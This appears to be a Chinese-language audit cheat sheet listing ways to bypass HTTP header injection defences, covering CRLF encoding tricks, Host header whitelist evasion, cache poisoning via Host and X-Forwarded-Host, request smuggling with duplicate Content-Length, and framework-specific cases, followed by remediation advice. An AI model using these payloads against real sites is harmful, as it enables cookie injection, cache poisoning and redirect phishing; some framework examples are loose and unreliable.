# HTTP 头注入绕过技巧

本文档汇总常见的 HTTP 头注入防护机制绕过技巧，用于深度安全审计和漏洞验证。

---

## 1. CRLF 注入绕过技巧

### 1.1 换行符编码和变体绕过

**防护机制**：简单的 `\r\n` 过滤

```python
# 防护代码
value = value.replace('\r\n', '')
```

**绕过技巧**：

#### 方式 1：分别过滤的绕过
```python
# 防护：只过滤 \r\n 组合
value = value.replace('\r\n', '')
# 但没有过滤单独的 \r 或 \n

# 绕过：使用分离的换行符
value = "test\nSet-Cookie: evil=1"  # 仅使用 \n
value = "test\rSet-Cookie: evil=1"  # 仅使用 \r

# 某些 HTTP 解析器会将 \r 或 \n 单独识别为换行
```

#### 方式 2：多字节和编码绕过
```
原始值：test\r\nX-Custom: value
绕过方式：
- URL 编码：test%0d%0aX-Custom: value
- 双重编码：test%250d%250aX-Custom: value
- Unicode 编码：test\u000d\u000aX-Custom: value
- HTML 实体：test&#13;&#10;X-Custom: value

# 某些框架会自动解码这些值
```

#### 方式 3：替换顺序问题
```python
# 危险的替换顺序（先替换 \r\n，再替换其他）
value = value.replace('\r\n', ' ')  # 替换为空格
value = value.replace('\n', ' ')    # 替换剩余 \n

# 绕过：如果替换为可用字符
value = value.replace('\r\n', '\r')  # 替换为 \r
# 结果仍然可能被某些解析器识别

# 或者多个 \r\n 的处理
value = "test\r\n\r\nX-Custom: value"
# 仅一次替换可能不完整
```

#### 方式 4：非标准换行符
```
某些 HTTP 实现接受的换行符变体：
- \r (单独的回车)
- \n (单独的换行)
- \r\r (双回车)
- \n\n (双换行)

绕过：测试这些变体
```

### 1.2 头字段值过滤绕过

**防护机制**：正则验证或字符限制

```python
# 防护代码
import re
if re.search(r'[\r\n]', value):
    raise ValueError("Invalid header")
```

**绕过技巧**：

#### 方式 1：字符大小写变化
```
某些老旧实现可能不一致地处理大小写：
- SET-COOKIE vs Set-Cookie vs set-cookie
- X-CUSTOM vs x-custom

# 绕过：使用不同大小写组合
```

#### 方式 2：头部字段名注入
```
防护可能只检查值，未检查头名称：
response.setHeader(user_header_name, "value")

# 绕过：在头名中注入
user_header_name = "X-Custom\r\nSet-Cookie: evil=1"
# 这样可能在某些框架中生成
# X-Custom\r\nSet-Cookie: evil=1: value
```

#### 方式 3：特殊字符绕过
```
某些框架对特殊字符处理不当：
- 空字节 (\x00)
- 制表符 (\t)
- 其他控制字符

绕过：混合使用这些字符
value = "test\x00\r\nX-Custom: value"
```

---

## 2. Host 头绕过技巧

### 2.1 验证绕过

**防护机制**：Host 头白名单验证

```python
# 防护代码
ALLOWED_HOSTS = ['example.com', 'www.example.com']
if request.host not in ALLOWED_HOSTS:
    abort(400)
```

**绕过技巧**：

#### 方式 1：端口号混淆
```
白名单：example.com
绕过：
- example.com:80 (默认端口)
- example.com:443 (HTTPS)
- example.com:8080 (其他端口)

某些验证实现可能不处理端口
```

#### 方式 2：子域名绕过
```
白名单：example.com
绕过：
- subdomain.example.com
- admin.example.com
- api.example.com

# 如果白名单只做后缀匹配
if host.endswith('example.com'):  # 不安全
    # subdomain.attacker.com 也可能通过（取决于实现）
```

#### 方式 3：IP 地址表示法
```
白名单：example.com
绕过：使用 IP 访问同一服务器
- 127.0.0.1
- ::1 (IPv6)
- 十进制 IP：2130706433 (127.0.0.1)
- 八进制 IP：0177.0000.0000.0001
- 混合表示法：127.0.0.0001

某些框架对这些变体处理不一致
```

#### 方式 4：国际化域名（IDN）绕过
```
白名单：example.com
绕过：
- exämple.com (Unicode 变体)
- еxample.com (西里尔字母 е 看似 e)
- 使用 xn-- 编码（Punycode）

如果验证在转换之前或之后，可能导致绕过
```

#### 方式 5：URL 编码绕过
```
白名单检查 example.com
绕过：
- example%2ecom (点号 URL 编码)
- example%3acom (冒号 URL 编码)

某些后端会解码，但验证不会
```

### 2.2 URL 重定向链接注入

**防护机制**：重定向 URL 验证

```python
# 防护代码
def redirect_url(target):
    return f"Location: {target}"
```

**绕过技巧**：

#### 方式 1：开放重定向
```
Host 头直接用于构造 URL：
Location: https://{request.host}/confirm

攻击者访问：
GET / HTTP/1.1
Host: attacker.com

响应：
Location: https://attacker.com/confirm
```

#### 方式 2：协议混淆
```
URL 构造可能缺少协议验证：
Location: //{request.host}/path  # 协议相对 URL

# 可能导致
Location: //attacker.com/path
# 这是合法的跨协议重定向
```

#### 方式 3：相对路径绕过
```
如果验证检查绝对 URL 但允许相对 URL：
Location: /{request.host}/path  # 这是相对路径

# 访问 attacker.com，会导致
Location: /attacker.com/path
```

---

## 3. HTTP 请求头注入绕过

### 3.1 代理转发污染

**防护机制**：请求头黑名单

```python
# 防护代码（不完整）
BLOCKED_HEADERS = ['Content-Length', 'Transfer-Encoding']
for key, value in src_headers.items():
    if key not in BLOCKED_HEADERS:
        dst_headers[key] = value
```

**绕过技巧**：

#### 方式 1：关键头遗漏
```
完整的敏感头列表：
- Content-Length
- Transfer-Encoding
- Host
- Connection
- Upgrade
- Authorization (某些情况)
- Cookie (某些情况)

绕过：在黑名单中遗漏的头
```

#### 方式 2：头名大小写变化
```
黑名单检查 'Content-Length'
绕过：
- content-length
- Content-length
- CONTENT-LENGTH

某些实现大小写敏感
```

#### 方式 3：头名编码变化
```
某些 HTTP 实现处理编码头名：
- Content%2dLength
- Content­Length (使用 Unicode 连接符)

绕过：这些变体可能不在黑名单中
```

#### 方式 4：多值头污染
```
某些头可以有多个值：
Content-Length: 10
Content-Length: 1000

# 后端可能使用不同的值，导致 HTTP 走私
```

---

## 4. HTTP/2 降级攻击绕过

### 4.1 大小写敏感性差异

**防护机制**：HTTP/2 到 HTTP/1.1 转换

```
HTTP/2 头是小写的
HTTP/1.1 头大小写无关紧要

转换时，某些实现处理不一致
```

**绕过技巧**：

#### 方式 1：头名大小写混淆
```
HTTP/2 请求：
:path: /path
x-custom-header: value

转换为 HTTP/1.1：
GET /path HTTP/1.1
X-Custom-Header: value  # 转换为驼峰大小写

或

x-custom-header: value  # 保留小写

如果后端期望驼峰大小写，可能导致验证绕过
```

#### 方式 2：伪头部的处理不一致
```
HTTP/2 伪头部：
:method:
:path:
:scheme:
:authority:

如果转换过程中处理不当：
- 可能被转换为普通头
- 可能被丢弃
- 可能产生冲突
```

#### 方式 3：头部顺序变化
```
HTTP/2 中，伪头部必须在常规头前
转换为 HTTP/1.1 时，顺序可能改变

某些解析器依赖特定顺序，导致绕过
```

### 4.2 协议混淆

**防护机制**：HTTP/2 安全实现

**绕过技巧**：

#### 方式 1：升级请求混淆
```
某些降级过程中，Upgrade 头处理不当
```

#### 方式 2：ALPN 协商欺骗
```
ALPN 协商中，可能向不同协议宣传能力
```

---

## 5. 缓存中毒绕过技巧

### 5.1 Vary 头绕过

**防护机制**：使用 Vary 头指示缓存键

```
Vary: Host, Accept-Encoding
```

**绕过技巧**：

#### 方式 1：Vary 头缺失
```
如果没有 Vary 头：
缓存键 = URL 路径

攻击：
GET / HTTP/1.1
Host: attacker.com

缓存返回的响应给所有访问 / 的用户
```

#### 方式 2：Vary 头不完整
```
Vary: Accept-Encoding
# 缺少 Host、User-Agent 等

攻击：污染基于不同头值的请求
```

#### 方式 3：缓存键构造绕过
```
某些实现可能不考虑 Vary 头：
cache_key = url_path + query_string
# 忽略 Host

攻击：
- 污染跨主机的缓存
- 使用不同 Host 头获得不同响应
```

### 5.2 X-Forwarded-* 污染

**防护机制**：使用 X-Forwarded-For 等头

```
X-Forwarded-For: client_ip
X-Forwarded-Host: host
```

**绕过技巧**：

#### 方式 1：头值直接用于缓存键
```
缓存键 = X-Forwarded-Host + URL

攻击：设置 X-Forwarded-Host 为任意值
X-Forwarded-Host: attacker.com

响应被缓存并返回给其他用户
```

#### 方式 2：多值头污染
```
X-Forwarded-For: 127.0.0.1, attacker.com
# 某些实现取最后一个值

攻击：在不受信任的代理后面，攻击者可以注入值
```

#### 方式 3：头名变化
```
不同的框架支持不同的头：
- X-Forwarded-Host
- X-Forwarded-For
- X-Original-Host
- X-Real-IP
- CF-Connecting-IP (Cloudflare)
- True-Client-IP

某些实现可能不一致地处理这些头
```

### 5.3 Set-Cookie 污染

**防护机制**：Set-Cookie 头限制

**绕过技巧**：

#### 方式 1：多个 Set-Cookie 头
```
HTTP/1.1 允许多个 Set-Cookie 头

# 注入多个 cookie
Set-Cookie: session=...
Set-Cookie: admin=true
Set-Cookie: role=admin
```

#### 方式 2：Cookie 属性注入
```
Set-Cookie: session=value; Path=/admin; Domain=.example.com

# 通过注入来污染 cookie 作用域
```

---

## 6. 特定框架绕过

### 6.1 Python (Flask/Django)

**防护机制**：响应头过滤

```python
# Flask
response.headers['X-Custom'] = user_input
```

**绕过技巧**：

#### 方式 1：werkzeug 版本差异
```python
# 不同版本的 werkzeug 可能有不同的过滤

# 某些版本接受 \r\n：
response.headers['X-Custom'] = "test\r\nX-Injected: value"

# 较新版本拒绝它
```

#### 方式 2：绕过字符编码
```python
# 使用 bytes 而不是字符串
response.headers['X-Custom'] = b"test\r\nX-Injected: value"
```

### 6.2 Java (Spring)

**防护机制**：HttpServletResponse 过滤

```java
response.addHeader(key, value);
```

**绕过技巧**：

#### 方式 1：直接写入输出流
```java
// 绕过 addHeader()
OutputStream out = response.getOutputStream();
out.write(("X-Custom: " + value + "\r\n").getBytes());
```

#### 方式 2：Spring 版本差异
```java
// 不同的 Spring 版本过滤可能不同
// 某些版本允许 CRLF，某些不允许
```

### 6.3 PHP

**防护机制**：header() 函数

```php
header("X-Custom: " . $_GET['value']);
```

**绕过技巧**：

#### 方式 1：ini 设置
```php
// 如果 expose_php = on，可能有额外的 X-Powered-By 头
header("X-Custom: " . $value);

// 某些 PHP 版本对 CRLF 更严格，某些较松散
```

#### 方式 2：输出缓冲
```php
// 在输出缓冲中写入头部
ob_start();
echo "X-Custom: " . $value . "\r\n";
$output = ob_get_clean();
```

### 6.4 Node.js (Express)

**防护机制**：response.setHeader()

```javascript
res.setHeader('X-Custom', userInput);
```

**绕过技巧**：

#### 方式 1：直接写入响应
```javascript
// 绕过 setHeader()
res.write("X-Custom: " + value + "\r\n");
```

#### 方式 2：end() 方法
```javascript
// 在响应结束前注入头
res.end("X-Custom: value\r\n\r\nbody content");
```

---

## 7. 防护机制检查清单

在进行安全审计时，检查以下防护机制：

| 防护机制 | 绕过难度 | 常见绕过方式 |
|---------|---------|----------|
| 简单 CRLF 过滤 | 低 | 编码、单独 \r 或 \n、多字节 |
| 头名白名单 | 低 | 大小写变化、编码、遗漏的头 |
| 头值白名单 | 中 | 编码、Unicode、特殊字符 |
| Host 白名单 | 中 | 端口号、子域名、IDN、IP 表示 |
| 框架内置过滤 | 高 | 版本差异、直接 I/O 操作 |

---

## 8. 审计建议

### 高风险指标
- 用户输入直接拼接到响应头
- Host 头未验证直接用于业务逻辑
- 代理转发未过滤敏感头
- 缓存键包含用户可控的头字段
- HTTP/2 到 HTTP/1.1 转换处理不当

### 审计步骤
1. **定位头操作**：搜索所有响应头和请求头设置
2. **追踪输入来源**：确认用户输入如何到达头设置
3. **验证防护机制**：评估现有的过滤和验证
4. **尝试绕过**：使用本文档中的技巧验证防护的鲁棒性
5. **测试框架特性**：检查框架版本和特定实现细节
6. **生成报告**：记录所有发现的漏洞

### 验证修复
修复 HTTP 头注入漏洞时，确保：
- 完整过滤或拒绝包含 CRLF 的所有变体（`\r`, `\n`, `\r\n`, 编码形式）
- 对敏感头字段实施白名单验证
- Host 头使用白名单验证，不用于业务关键逻辑
- 代理转发实施敏感头黑名单过滤
- 缓存键不包含用户可控的头字段
- 框架和库保持最新版本
- 进行渗透测试验证修复的有效性
